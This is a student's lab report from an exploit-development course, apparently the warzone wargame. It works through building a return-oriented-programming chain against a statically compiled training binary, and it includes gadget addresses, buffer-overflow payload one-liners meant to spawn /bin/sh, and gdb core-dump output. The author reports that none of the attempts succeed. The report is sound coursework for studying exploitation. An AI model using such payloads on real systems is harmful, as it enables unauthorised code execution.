Carter Gunderson
9 lab report

0x08049451 : int 0x80

0x080bba76 : pop eax ; ret

0x080481c9 : pop ebx ; ret

0x080e5139 : pop ecx ; ret

0x0806ecaa : pop edx ; ret

libc : 0xb7f83a24 ("/bin/sh")

 pop eax; 0x0b ; pop ebx; "/bin/sh" ; pop

python -c 'print "A" * 156 + "\x76\xba\x0b\x08" + "\x0b\x00\x00\x00" + "\xc9\x81\x04\x08" + "\x24\x3a\xf8\xb7" + "\x39\x51\x0e\x08" + "\x00\x00\x00\x00" + "\xaa\xec\x06\x08" + "\x00\x00\x00\x00" + "\x51\x94\x04\x08" '


Worked in class with Kenna and Miranda

had to do a static compile so that it would have the c library
in the binary 

gcc -static -fno-stack-protector



the idea is we have to use the gadgets to make our code
a gadget is a line of assembly that ends in a return

ropgadget lab5C >> gadgets.txt

then grep that file for the stuff we need

so at the top of the page are the addresses for the 
gadgets we needed

because the idea is to do a system call execve
which has the following arguements

eax: 0x0b
ebx: 0xb7f83a24 --> "/bin/sh"
ecx: null
edx: null

so we got all the gadgets to pop into those registers
and wrote it all out backwards because of the little endianness

we thought it was going to work but we forgot to check the offset
so we did the thing with so many A's and then 4 B's like in the lecture

and did 
ulimit -c unlimited
to get the core to dump
and then checked it until we got it to be lined up with the B's and thats at 156 A's

and thought that would work and it doesnt
and I realize now why is because we never called 
the interrupt 
int 0x80
which is the thing that would care that we had so nicely
filled up the registers for it

so now I'm back home and I need to find this int 0x80 gadget

cat mygadgets.txt | grep "int 0x80"

0x08049451 : int 0x80

there it is I'll put it at the top with the others
and flip it to have the little end and I think it should
be the first one in the chain
wait no, the last one, because everything has the be lined up
in the registers and ready to go when the interrupt happens


ok well I thought that would work but it didnt


maybe i need to zero out the registers first? before I put new stuff in them?
so that means getting some xor e*x e*x

0x08054530 : xor eax, eax ; ret

but I couldn't find the others

so I tried it again and looked at the core

python -c 'print "A" * 156 + "\x76\xba\x0b\x08" + "\x0b\x00\x00\x00" + "\xc9\x81\x04\x08" + "\x24\x3a\xf8\xb7" + "\x39\x51\x0e\x08" + "\x00\x00\x00\x00" + "\xaa\xec\x06\x08" + "\x00\x00\x00\x00" + "\x51\x94\x04\x08" '

backtrace in gdb with bt to look at the stack, heres what I got:

lab5C@warzone:/tmp/lab5c$ gdb -c core
[New LWP 2528]
Core was generated by `./lab5C2'.
Program terminated with signal SIGABRT, Aborted.
#0  0xb7ffdd4c in __kernel_vsyscall ()
gdb-peda$ bt
#0  0xb7ffdd4c in __kernel_vsyscall ()
#1  0x0807b8b7 in ?? () 
#2  0x0000003c in ?? ()
#3  0x0804de81 in ?? ()
#4  0x00000006 in ?? ()
#5  0xbffff454 in ?? ()
#6  0x0804fe00 in ?? ()
#7  0x00000001 in ?? ()
#8  0x080d98cf in ?? ()
#9  0x080bee34 in ?? ()


and none of those look like part of my rop chain

so I'll try again with just the B's 

ok that worked the BS are right there on top
of the stack. so what happens now if I just add
the pointer to pop eax; ret , it will return somewhere
weird.
so instead maybe lets see if I can do the same thing that
we did in the lecture and get it to return 0x69

 python -c 'print "A" * 156 + "\x90\x43\x05\x08" + "\xc9\x81\x04\x08" + "\x69\x00\x00\x00" + "\xf6\xb5\x07\x08" + "\x01\x94\x04\x08" ' | ./lab5C2

gdb-peda$ bt
#0  0x08054390 in ?? ()
#1  0x080481c9 in ?? ()
Backtrace stopped: previous frame inner to this frame (corrupt stack?)
gdb-peda$

so it looks like the first two instructions got on the stack
but then the next one breaks it for some reason? It didnt give me
105 it gave me 139

damn ok I'm dumb I was just copying and pasting gadgets between
two different executables and expecting it to work.
so I need to find 

xor eax, eax
pob ebx
inc eax
int 0x80 

but I already have pop ebx and int0x80 and the xors
so I just need the inc eax


0x08054530 : xor eax, eax ; ret
0x080481c9 : pop ebx ; ret
0x0807b796 : inc eax ; ret
0x08049451 : int 0x80

python -c 'print "A" * 156 + "\x30\x45\x05\x08" + "\xc9\x81\x04\x08" + "\x96\xb7\x07\x08" + "\x51\x94\x04\x08"'

that doesn't work either and now I'm really lost. maybe the offset is wrong?


no I dont know

I'll have to come back to this one 


